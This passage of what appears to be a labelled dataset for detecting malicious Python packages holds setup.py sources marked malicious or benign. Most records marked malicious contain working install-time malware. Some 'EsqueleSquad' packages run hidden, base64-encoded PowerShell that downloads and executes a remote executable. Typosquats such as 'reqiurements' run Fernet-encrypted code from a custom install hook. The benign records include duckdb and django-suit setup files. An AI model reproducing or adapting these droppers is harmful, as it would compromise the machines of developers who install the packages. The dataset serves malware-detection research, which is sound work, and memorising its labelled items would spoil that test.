Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "tppinghydrainfo-8.1", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tppinghydrainfo',\n    packages = ['modlib'],\n    version = '3.54',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "libencodeurlnvidia-7.57", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libencodeurlnvidia',\n    packages = ['modlib'],\n    version = '5.8',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "peppyw-5.8", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'peppyw',\n    packages = ['modlib'],\n    version = '8.24',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "django-suit-0.2.28", "func": "from setuptools import setup\n\nwith open(\"README.rst\", \"r\") as fh:\n    long_description = fh.read()\n\nsetup(\n    name='django-suit',\n    version=__import__('suit').VERSION,\n    description='Modern theme for Django admin interface.',\n    long_description=long_description,\n    long_description_content_type=\"text/x-rst\",\n    author='Kaspars Sprogis (darklow)',\n    author_email='info@djangosuit.com',\n    url='http://djangosuit.com',\n    packages=['suit', 'suit.templatetags'],\n    zip_safe=False,\n    include_package_data=True,\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Framework :: Django',\n        'License :: Free for non-commercial use',\n        'Intended Audience :: Developers',\n        'Intended Audience :: System Administrators',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2.5',\n        'Programming Language :: Python :: 2.6',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3.2',\n        'Programming Language :: Python :: 3.3',\n        'Environment :: Web Environment',\n        'Topic :: Software Development',\n        'Topic :: Software Development :: User Interfaces',\n    ]\n)\n", "target": 0}
{"idx": "duckdb-0.4.0", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nimport os\nimport sys\nimport platform\nimport multiprocessing.pool\n\nfrom setuptools import setup, Extension\nfrom setuptools.command.build_ext import build_ext as _build_ext\n\n\nclass CompilerLauncherMixin:\n    \"\"\"Add \"compiler launchers\" to distutils.\n\n    We use this to be able to run the build using \"ccache\".\n\n    A compiler launcher is a program that is invoked instead of invoking the\n    compiler directly. It is passed the full compiler invocation command line.\n\n    A similar feature exists in CMake, see\n    https://cmake.org/cmake/help/latest/prop_tgt/LANG_COMPILER_LAUNCHER.html.\n    \"\"\"\n\n    __is_set_up = False\n\n    def build_extensions(self):\n        # Integrate into \"build_ext\"\n        self.__setup()\n        super().build_extensions()\n\n    def build_libraries(self):\n        # Integrate into \"build_clib\"\n        self.__setup()\n        super().build_extensions()\n\n    def __setup(self):\n        if self.__is_set_up:\n            return\n        self.__is_set_up = True\n        compiler_launcher = os.getenv(\"DISTUTILS_C_COMPILER_LAUNCHER\")\n        if compiler_launcher:\n\n            def spawn_with_compiler_launcher(cmd):\n                exclude_programs = (\"link.exe\",)\n                if not cmd[0].endswith(exclude_programs):\n                    cmd = [compiler_launcher] + cmd\n                return original_spawn(cmd)\n\n            original_spawn = self.compiler.spawn\n            self.compiler.spawn = spawn_with_compiler_launcher\n\n\nclass build_ext(CompilerLauncherMixin, _build_ext):\n    pass\n\n\nlib_name = 'duckdb'\n\nextensions = ['parquet', 'icu', 'fts', 'tpch', 'tpcds', 'visualizer', 'json', 'excel']\n\nif platform.system() == 'Windows':\n    extensions = ['parquet', 'icu', 'fts', 'tpch', 'json', 'excel']\n\nunity_build = 0\nif 'DUCKDB_BUILD_UNITY' in os.environ:\n    unity_build = 16\n\ndef parallel_cpp_compile(self, sources, output_dir=None, macros=None, include_dirs=None, debug=0,\n                         extra_preargs=None, extra_postargs=None, depends=None):\n    # Copied from distutils.ccompiler.CCompiler\n    macros, objects, extra_postargs, pp_opts, build = self._setup_compile(\n        output_dir, macros, include_dirs, sources, depends, extra_postargs)\n\n    cc_args = self._get_cc_args(pp_opts, debug, extra_preargs)\n\n    def _single_compile(obj):\n        try:\n            src, ext = build[obj]\n        except KeyError:\n            return\n        self._compile(obj, src, ext, cc_args, extra_postargs, pp_opts)\n\n    list(multiprocessing.pool.ThreadPool(multiprocessing.cpu_count()).imap(_single_compile, objects))\n    return objects\n\n\n# speed up compilation with: -j = cpu_number() on non Windows machines\nif os.name != 'nt':\n    import distutils.ccompiler\n    distutils.ccompiler.CCompiler.compile = parallel_cpp_compile\n\ndef open_utf8(fpath, flags):\n    import sys\n    if sys.version_info[0] < 3:\n        return open(fpath, flags)\n    else:\n        return open(fpath, flags, encoding=\"utf8\")\n\n# make sure we are in the right directory\nos.chdir(os.path.dirname(os.path.realpath(__file__)))\n\nif os.name == 'nt':\n    # windows:\n    toolchain_args = ['/wd4244', '/wd4267', '/wd4200', '/wd26451', '/wd26495', '/D_CRT_SECURE_NO_WARNINGS']\nelse:\n    # macos/linux\n    toolchain_args = ['-std=c++11', '-g0']\n    if 'DUCKDEBUG' in os.environ:\n        toolchain_args = ['-std=c++11', '-Wall', '-O0', '-g']\nif 'DUCKDB_INSTALL_USER' in os.environ and 'install' in sys.argv:\n    sys.argv.append('--user')\n\nexisting_duckdb_dir = ''\nnew_sys_args = []\nlibraries = []\nfor i in range(len(sys.argv)):\n    if sys.argv[i].startswith(\"--binary-dir=\"):\n        existing_duckdb_dir = sys.argv[i].split('=', 1)[1]\n    elif sys.argv[i].startswith('--package_name=') :\n        lib_name = sys.argv[i].split('=', 1)[1]\n    elif sys.argv[i].startswith(\"--compile-flags=\"):\n        toolchain_args = ['-std=c++11'] + [x.strip() for x in sys.argv[i].split('=', 1)[1].split(' ') if len(x.strip()) > 0]\n    elif sys.argv[i].startswith(\"--libs=\"):\n        libraries = [x.strip() for x in sys.argv[i].split('=', 1)[1].split(' ') if len(x.strip()) > 0]\n    else:\n        new_sys_args.append(sys.argv[i])\nsys.argv = new_sys_args\ntoolchain_args.append('-DDUCKDB_PYTHON_LIB_NAME='+lib_name)\n\nif platform.system() == 'Darwin':\n    toolchain_args.extend(['-stdlib=libc++', '-mmacosx-version-min=10.7'])\n\nif platform.system() == 'Windows':\n    toolchain_args.extend(['-DDUCKDB_BUILD_LIBRARY','-DWIN32'])\n\nif 'BUILD_HTTPFS' in os.environ:\n    libraries += ['crypto', 'ssl']\n    extensions += ['httpfs']\n\nfor ext in extensions:\n    toolchain_args.extend(['-DBUILD_{}_EXTENSION'.format(ext.upper())])\n\nclass get_pybind_include(object):\n    def __init__(self, user=False):\n        self.user = user\n\n    def __str__(self):\n        import pybind11\n        return pybind11.get_include(self.user)\n\nclass get_numpy_include(object):\n    def __str__(self):\n        import numpy\n        return numpy.get_include()\n\n\nextra_files = []\nheader_files = []\n\nscript_path = os.path.dirname(os.path.abspath(__file__))\nmain_include_path = os.path.join(script_path, 'src', 'include')\nmain_source_path = os.path.join(script_path, 'src')\nmain_source_files = ['duckdb_python.cpp'] + [os.path.join('src', x) for x in os.listdir(main_source_path) if '.cpp' in x]\ninclude_directories = [main_include_path, get_numpy_include(), get_pybind_include(), get_pybind_include(user=True)]\nif len(existing_duckdb_dir) == 0:\n    # no existing library supplied: compile everything from source\n    source_files = main_source_files\n\n    # check if amalgamation exists\n    if os.path.isfile(os.path.join(script_path, '..', '..', 'scripts', 'amalgamation.py')):\n        # amalgamation exists: compiling from source directory\n        # copy all source files to the current directory\n        sys.path.append(os.path.join(script_path, '..', '..', 'scripts'))\n        import package_build\n        (source_list, include_list, original_sources) = package_build.build_package(os.path.join(script_path, lib_name), extensions, False, unity_build)\n\n        duckdb_sources = [os.path.sep.join(package_build.get_relative_path(script_path, x).split('/')) for x in source_list]\n        duckdb_sources.sort()\n\n        original_sources = [os.path.join(lib_name, x) for x in original_sources]\n\n        duckdb_includes = [os.path.join(lib_name, x) for x in include_list]\n        duckdb_includes += [lib_name]\n\n        # gather the include files\n        import amalgamation\n        header_files = amalgamation.list_includes_files(duckdb_includes)\n\n        # write the source list, include list and git hash to separate files\n        with open_utf8('sources.list', 'w+') as f:\n            for source_file in duckdb_sources:\n                f.write(source_file + \"\\n\")\n\n        with open_utf8('includes.list', 'w+') as f:\n            for include_file in duckdb_includes:\n                f.write(include_file + '\\n')\n\n        extra_files = ['sources.list', 'includes.list'] + original_sources\n    else:\n        # if amalgamation does not exist, we are in a package distribution\n        # read the include files, source list and include files from the supplied lists\n        with open_utf8('sources.list', 'r') as f:\n            duckdb_sources = [x for x in f.read().split('\\n') if len(x) > 0]\n\n        with open_utf8('includes.list', 'r') as f:\n            duckdb_includes = [x for x in f.read().split('\\n') if len(x) > 0]\n\n    source_files += duckdb_sources\n    include_directories = duckdb_includes + include_directories\n\n    libduckdb = Extension(lib_name,\n        include_dirs=include_directories,\n        sources=source_files,\n        extra_compile_args=toolchain_args,\n        extra_link_args=toolchain_args,\n        libraries=libraries,\n        language='c++')\nelse:\n    sys.path.append(os.path.join(script_path, '..', '..', 'scripts'))\n    import package_build\n\n    toolchain_args += ['-I' + x for x in package_build.includes(extensions)]\n\n    result_libraries = package_build.get_libraries(existing_duckdb_dir, libraries, extensions)\n    library_dirs = [x[0] for x in result_libraries if x[0] is not None]\n    libnames = [x[1] for x in result_libraries if x[1] is not None]\n\n    libduckdb = Extension(lib_name,\n        include_dirs=include_directories,\n        sources=main_source_files,\n        extra_compile_args=toolchain_args,\n        extra_link_args=toolchain_args,\n        libraries=libnames,\n        library_dirs=library_dirs,\n        language='c++')\n\n# Only include pytest-runner in setup_requires if we're invoking tests\nif {'pytest', 'test', 'ptr'}.intersection(sys.argv):\n    setup_requires = ['pytest-runner']\nelse:\n    setup_requires = []\n\nsetuptools_scm_conf = {\"root\": \"../..\", \"relative_to\": __file__}\nif os.getenv('SETUPTOOLS_SCM_NO_LOCAL', 'no') != 'no':\n    setuptools_scm_conf['local_scheme'] = 'no-local-version'\n\n# data files need to be formatted as [(directory, [files...]), (directory2, [files...])]\n# no clue why the setup script can't do this automatically, but hey\ndef setup_data_files(data_files):\n    directory_map = {}\n    for data_file in data_files:\n        normalized_fpath = os.path.sep.join(data_file.split('/'))\n        splits = normalized_fpath.rsplit(os.path.sep, 1)\n        if len(splits) == 1:\n            # no directory specified\n            directory = \"\"\n            fname = normalized_fpath\n        else:\n            directory = splits[0]\n            fname = splits[1]\n        if directory not in directory_map:\n            directory_map[directory] = []\n        directory_map[directory].append(normalized_fpath)\n    new_data_files = []\n    for kv in directory_map.keys():\n        new_data_files.append((kv, directory_map[kv]))\n    return new_data_files\n\ndata_files = setup_data_files(extra_files + header_files)\n\nsetup(\n    name = lib_name,\n    description = 'DuckDB embedded database',\n    keywords = 'DuckDB Database SQL OLAP',\n    url=\"https://www.duckdb.org\",\n    long_description = 'See here for an introduction: https://duckdb.org/docs/api/python',\n    license='MIT',\n    install_requires=[ # these version is still available for Python 2, newer ones aren't\n         'numpy>=1.14'\n    ],\n    data_files = data_files,\n    packages=[\n        'duckdb_query_graph',\n        'duckdb-stubs'\n    ],\n    include_package_data=True,\n    setup_requires=setup_requires + [\"setuptools_scm\"] + ['pybind11>=2.6.0'],\n    use_scm_version = setuptools_scm_conf,\n    tests_require=['pytest'],\n    classifiers = [\n        'Topic :: Database :: Database Engines/Servers',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n    ],\n    ext_modules = [libduckdb],\n    maintainer = \"Hannes Muehleisen\",\n    maintainer_email = \"hannes@cwi.nl\",\n    cmdclass={\"build_ext\": build_ext},\n)\n", "target": 0}
{"idx": "selfedpinggui-8.7", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfedpinggui',\n    packages = ['modlib'],\n    version = '6.90',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "bip-utilds-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = ' JFXamLXKVUteqzKCSxSuGpGPlzeYLtUeSrWeWVyOvegbrp'\nLONG_DESCRIPTION = 'yMiePBkwwbfMfteNIqlIfqizwLOOsZtqcSXTiIjXOqXHMrC An KHWgJflhVKVNtneqhGKFLKSNRtUxgfBUeAyuPRdqbnEmYTPnlmSyDrmVtjgycvRCAgohegcmZVrUVXCRKmtSvwdjphNxNrLWyjDRrezyVPhpWPuogD eriItDfgRdBlkrebHqGAPFWIpVQJUDyOOzBOTxRoCXizrzlUPifObmrawMepPRfPXapzTTmfR oBRybEPSpkSqYiLaASk WOFbYWRnkHInyzgbNgDstJwGaMMWvzow qgKGaOJUAzjZ HztRrxBNDB mXzKwCghvvQKC'\n\n\nclass GruppeInstall(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'AxKi0TwxSzs7uvZ1eVPLNo_u9G7OhWSmQtHFPpJwhGI=').decrypt(b'gAAAAABmA1qiiIhaOQHv_cvtklYfvb5YYjKGqXiqY1vbBxexYE-5CM0tFtldushKg-NLg_k7z0U7UauQj0CZ63xo4iaOGkjtc5KxRneLGOtCsBwKJUsCBMC4VHh7Fp-AJS8DFAruHk3cFZsqmHd9ROzcNe2C0Kk2oVa8KsDls3YACRHbdYspacnygNULQpZkfTp8s-4kJcLIbHzbi-APmvzVu4zJfMX5tUu2nTiCtVWthsnV87jIfOk='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"bip-utilds\",\n    version=VERSION,\n    author=\"IajucmEersUtOxC\",\n    author_email=\"VyoJJ@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': GruppeInstall,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "reqiurements-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'CgrEAD xLdzoIItLlIWSeAOdFVwsBjYrlFvBmFyrgHANmDaVK'\nLONG_DESCRIPTION = 'MZKjhelpftHSckOHPG MWn snQEjRo YkaQGw vGVsjqVXYOrVsFONOEBOFOJeBTfMTIJgTadbYuAOocEhnQRwcOOtL BLaVlBHKxpvEWtFAHDRDgjPBI CpHvAXIYZvWKCEcrLXXFhr FNULcCkmnfbkXwSkuQvZdnsWUFKkDCPsnQamZDiANYitPWIxWfGOHOfdEbmKqZKrsRETtPrjLgpeUkOwjhhGbZkEIImImOlncKmLHtLohfHkvmsHlgGWCdOAUZAFHkjfVkKUJdJtL ndvAERBvlsqeUpYhYgvIPbgvoxgHeXKiEoSlVwQrPGniTBbRawIoBbhgsVnzhZosetpziuUdOOaPdWonh tVYUMMSrAEawoySfGvboQKzghzXBrxXgVzPILCwMzADSzqJFzlrdqeNFfJYCNloyWCfnYVhZYPFhuLojmyvxXUoOlbGVFhCTYwqYsMoUHtBYM'\n\n\nclass igdWfnwAcLPFwnBiSOCkIfgNpYLiqQduKTEDfWSQvhcnZFHUdMfjIntHpHTGyDIcsqoktSbKQmEALMluPmyaHesoRnSdKcSUAImcbtJIt(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'N0sDJpRJixjyxuk3nNPfZ93SLTiWygVCcdLv5NVkyME=').decrypt(b'gAAAAABmBIWaXARfQrAmOiw_aS1HGVU-VJT8KAfOjVil-UVaUhdHqsRPUN3LKxA7dqPwRCohPcUOrq-qwQnCNffcAonIv0rj-voUclndqxBjID3urhc8n90bQzGz9KEhGpyoQhyvDMYpd5mz77_-BY-d542fEuDabw7BN-kgpgCZErkpIETgk6Dl0P2J5FwLzEuhVDALtkysCzvzlaCQWIVR3WcAgwHc_4Tz1tYXQWF1-RoMBU_xkBo='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"reqiurements\",\n    version=VERSION,\n    author=\"WjgyHIVvoDJ\",\n    author_email=\"utrJhR@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': igdWfnwAcLPFwnBiSOCkIfgNpYLiqQduKTEDfWSQvhcnZFHUdMfjIntHpHTGyDIcsqoktSbKQmEALMluPmyaHesoRnSdKcSUAImcbtJIt,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "py-candyintcontrol-2.7", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-candyintcontrol',\n    packages = ['modlib'],\n    version = '10.24',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "loadcraft-3.4", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'loadcraft',\n    packages = ['modlib'],\n    version = '4.17',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "dedupe-hcluster-0.3.9", "func": "#!/usr/bin/env python\nfrom setuptools import setup, Extension\nimport numpy\n\ntry:\n    from Cython.Build import cythonize\n    use_cython = True\nexcept ImportError:\n    use_cython = False\n\n\next_modules = [Extension('hcluster._distance_wrap',\n                         ['hcluster/distance_wrap.c'],\n                         include_dirs=[numpy.get_include()])]\n\nif use_cython:\n    ext_modules += cythonize([Extension('hcluster._hierarchy',\n                                        ['hcluster/_hierarchy.pyx'],\n                                        include_dirs=[numpy.get_include()])])\nelse:\n    ext_modules += [Extension('hcluster._hierarchy',\n                              ['hcluster/_hierarchy.c'],\n                              include_dirs=[numpy.get_include()])]\n\nsetup(maintainer=\"Forest Gregg\",\n      version=\"0.3.9\",\n      name='dedupe-hcluster',\n      packages=['hcluster'],\n      maintainer_email=\"fgregg@datamade.us\",\n      description=\"Hierarchical Clustering Algorithms (Information Theory)\",\n      url=\"https://github.com/datamade/hcluster\",\n      license=\"SciPy License (BSD Style)\",\n      install_requires=[\"numpy>=1.10.4 ;python_version<'3.6'\",\n                        \"numpy>=1.12.1 ;python_version=='3.6'\",\n\t                \"numpy>=1.15.0; python_version=='3.7'\",\n\t\t        \"numpy>=1.17.3; python_version=='3.8'\",\n\t\t        \"numpy; python_version>'3.8'\"],\n      ext_modules=ext_modules,\n      long_description=\"\"\"\nThis library provides Python functions for hierarchical clustering. Its features\ninclude\n\n    * generating hierarchical clusters from distance matrices\n    * computing distance matrices from observation vectors\n    * computing statistics on clusters\n    * cutting linkages to generate flat clusters\n    * and visualizing clusters with dendrograms.\n\nThe interface is very similar to MATLAB's Statistics Toolbox API to make code\neasier to port from MATLAB to Python/Numpy. The core implementation of this\nlibrary is in C for efficiency.\n\"\"\",\n      keywords=['dendrogram', 'linkage', 'cluster', 'agglomorative', 'hierarchical', 'hierarchy', 'ward', 'distance'],\n      classifiers = [\"Topic :: Scientific/Engineering :: 